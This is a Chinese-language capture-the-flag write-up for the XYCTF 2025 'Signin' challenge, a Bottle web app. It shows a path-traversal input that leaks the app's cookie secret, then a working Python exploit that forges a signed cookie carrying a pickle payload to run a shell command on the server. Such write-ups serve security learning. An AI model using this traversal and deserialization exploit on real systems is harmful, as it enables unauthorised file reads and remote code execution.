# [XYCTF] 2025  Signin
源码：
```python
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
with open('../../secret.txt', 'r') as f:
    secret = f.read()

app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=8080, debug=False)



```
看到`/download`路由存在任意读取，小waf我们绕一下：
```http
?filename=./.././.././.././secret.txt
```
得到密钥：`Hell0_H@cker_Y0u_A3r_Sm@r7`
我们看看cookie的生成逻辑，跟进`get_cookie`函数
```python
    def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default
```
看到这里还存在反序列化，这是好像想到之前看过关于bottle模板的`get_cookie`造成的反序列化问题
```python
from bottle import cookie_encode
import os
import requests
secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class Test:
    def __reduce__(self):
        return (eval, ("""__import__('os').system('cp /f* ./2.txt')""",))

exp = cookie_encode(
    ('session', {"name": [Test()]}),
    secret
)

requests.get('http://gz.imxbt.cn:20458/secret', cookies={'name': exp.decode()})


```
伪造session发包，这里内容是什么不重要，因为根据源码name=admin也不能得到flag
我们的目的是打反序列化，执行我们的命令就好了。
